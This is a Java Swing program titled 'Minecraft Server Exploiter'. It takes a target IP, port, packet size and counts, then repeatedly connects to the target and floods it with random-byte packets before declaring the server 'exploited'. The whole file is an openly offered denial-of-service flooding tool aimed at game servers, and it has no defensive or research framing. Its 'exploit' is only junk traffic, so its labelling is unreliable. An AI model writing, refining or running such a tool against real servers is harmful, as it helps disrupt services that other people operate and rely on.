package org.dw363;

import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import java.net.*;
import java.io.*;
import java.util.Random;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

public class MinecraftServerExploit extends JFrame {
    private JTextField ipField, portField, packetSizeField, packetCountField, reconnectCountField;
    private JButton exploitButton;
    private JLabel statusLabel;

    public MinecraftServerExploit() {
        setTitle("Minecraft Server Exploiter");
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setSize(400, 300);
        setLocationRelativeTo(null);

        JPanel panel = new JPanel(new GridBagLayout());
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);

        gbc.gridx = 0;
        gbc.gridy = 0;
        panel.add(new JLabel("Server IP:"), gbc);

        gbc.gridx = 1;
        gbc.gridy = 0;
        ipField = new JTextField(15);
        panel.add(ipField, gbc);

        gbc.gridx = 0;
        gbc.gridy = 1;
        panel.add(new JLabel("Server Port:"), gbc);

        gbc.gridx = 1;
        gbc.gridy = 1;
        portField = new JTextField(5);
        panel.add(portField, gbc);

        gbc.gridx = 0;
        gbc.gridy = 2;
        panel.add(new JLabel("Packet Size (KB):"), gbc);

        gbc.gridx = 1;
        gbc.gridy = 2;
        packetSizeField = new JTextField(5);
        panel.add(packetSizeField, gbc);

        gbc.gridx = 0;
        gbc.gridy = 3;
        panel.add(new JLabel("Packet Count:"), gbc);

        gbc.gridx = 1;
        gbc.gridy = 3;
        packetCountField = new JTextField(5);
        panel.add(packetCountField, gbc);

        gbc.gridx = 0;
        gbc.gridy = 4;
        panel.add(new JLabel("Reconnect Count:"), gbc);

        gbc.gridx = 1;
        gbc.gridy = 4;
        reconnectCountField = new JTextField(5);
        panel.add(reconnectCountField, gbc);

        gbc.gridx = 0;
        gbc.gridy = 5;
        gbc.gridwidth = 2;
        exploitButton = new JButton("Exploit Server");
        exploitButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                exploitServer();
            }
        });
        panel.add(exploitButton, gbc);

        gbc.gridx = 0;
        gbc.gridy = 6;
        gbc.gridwidth = 2;
        statusLabel = new JLabel("");
        panel.add(statusLabel, gbc);

        add(panel, BorderLayout.CENTER);
        setVisible(true);
    }

    private void exploitServer() {
        String ip = ipField.getText();
        int port = Integer.parseInt(portField.getText());
        int packetSize = Integer.parseInt(packetSizeField.getText()) * 1024;
        int reconnectCount = Integer.parseInt(reconnectCountField.getText());

        try {
            for (int i = 0; i < reconnectCount; i++) {
                Socket socket = new Socket(ip, port);
                OutputStream out = socket.getOutputStream();

                // Exploit code goes here
                int packetCount = Integer.parseInt(packetCountField.getText());
                for (int j = 0; j < packetCount; j++) {
                    byte[] exploitPacket = generateExploitPacket(packetSize);
                    out.write(exploitPacket);
                    out.flush();
                    logDebugInfo("Sent exploit packet " + (j + 1) + " of " + packetCount);
                    Thread.sleep(100); // Задержка между пакетами
                }
                socket.close();
                logDebugInfo("Reconnect attempt " + (i + 1) + " of " + reconnectCount);
            }

            statusLabel.setText("Server has been exploited!");
        } catch (IOException ex) {
            handleNetworkError(ex);
        } catch (InterruptedException e) {
            handleUnexpectedError(e);
        }
    }

    private byte[] generateExploitPacket(int size) {
        byte[] packet = new byte[size];
        Random random = new Random();
        random.nextBytes(packet);
        return packet;
    }

    private void logDebugInfo(String message) {
        System.out.println("[DEBUG] " + message);
    }

    private void handleNetworkError(Exception e) {
        statusLabel.setText("Network error: " + e.getMessage());
        e.printStackTrace();
    }

    private void handleUnexpectedError(Exception e) {
        statusLabel.setText("Unexpected error: " + e.getMessage());
        e.printStackTrace();
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                new MinecraftServerExploit();
            }
        });
    }
}